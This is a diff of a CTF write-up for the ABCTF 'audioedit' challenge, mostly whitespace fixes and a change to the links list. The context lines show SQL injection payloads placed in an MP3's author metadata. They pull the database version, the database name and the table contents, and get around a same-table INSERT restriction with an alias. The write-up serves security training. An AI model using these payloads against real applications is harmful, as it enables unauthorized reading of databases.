@@ -30,7 +30,7 @@ I used [easyTAG](https://wiki.gnome.org/Apps/EasyTAG) but of course you can use 
 In order to do an injection and maintain a valid INSERTION statement you can create an mp3
 with the following meta data:
 
-   
+
     title  = "" (leer)
     author = a', (SELECT @@version))-- -b
 
@@ -44,7 +44,7 @@ discarded...
 This gave us the database version: 5.5.49-0ubuntu0.14.04.1
 
 Next we wanted to know the database name:
-    
+
     author = a', (SELECT database()))-- -b:
     audioedit
 
@@ -60,7 +60,7 @@ And of course the column names:
 So finally we wanted see whats in there:
 
     author = a',(SELECT author FROM audioedit.audioedit LIMIT 0,1))-- -a
-    
+
 ... but this gave us an insertion error!:(
 
 The problem is you can't select from a database that you're inserting into at the same time... Thanks to Arxenix!:)
@@ -68,14 +68,14 @@ The problem is you can't select from a database that you're inserting into at th
 So we got around by using AS:
 
     author = a',(SELECT author FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
-    ABCTF 
+    ABCTF
     author = a',(SELECT title FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
-    flag 
+    flag
     author = a',(SELECT file FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
     supersecretflagf1le.mp3
-    
+
 Using this info we visited the corresponding site: http://107.170.122.6/audioedit/edit.php?file=supersecretflagf1le.mp3
-    
+
 Setting the visualization to 'Sonogram' finally showed us the flag:
 
     ABCTF{m3t4_inj3cti00n}
@@ -84,6 +84,4 @@ Setting the visualization to 'Sonogram' finally showed us the flag:
 
 ## Other write-ups and resources
 
-* http://countersite.org/articles/web-vulnerability/105-audioedit-writeup.html
-
-* http://blog.ankursundara.com/abctf/
+* (Russian) http://countersite.org/articles/web-vulnerability/105-audioedit-writeup.html
